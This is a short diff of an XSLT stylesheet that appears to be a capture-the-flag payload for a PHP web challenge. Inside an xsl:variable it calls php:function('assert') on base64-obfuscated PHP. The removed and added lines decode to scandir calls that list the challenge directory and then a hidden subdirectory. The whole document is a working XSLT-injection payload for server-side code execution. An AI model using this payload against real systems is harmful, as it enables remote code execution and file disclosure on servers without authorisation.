@@ -4,7 +4,7 @@
     <html>
       <body>
         <xsl:variable name="eval">
-          eval(base64_decode("dmFyX2R1bXAoc2NhbmRpcigiL2NoYWxsZW5nZS93ZWItc2VydmV1ci9jaDUwLyIpKTsK"))
+          eval(base64_decode("dmFyX2R1bXAoc2NhbmRpcigiL2NoYWxsZW5nZS93ZWItc2VydmV1ci9jaDUwLy42ZmYzMjAwYmVlNzg1ODAxZjQyMGZiYTgyNmZmY2RlZSIpKTsK"))
         </xsl:variable>
         <xsl:value-of select="php:function('assert', $eval)" />
       </body>
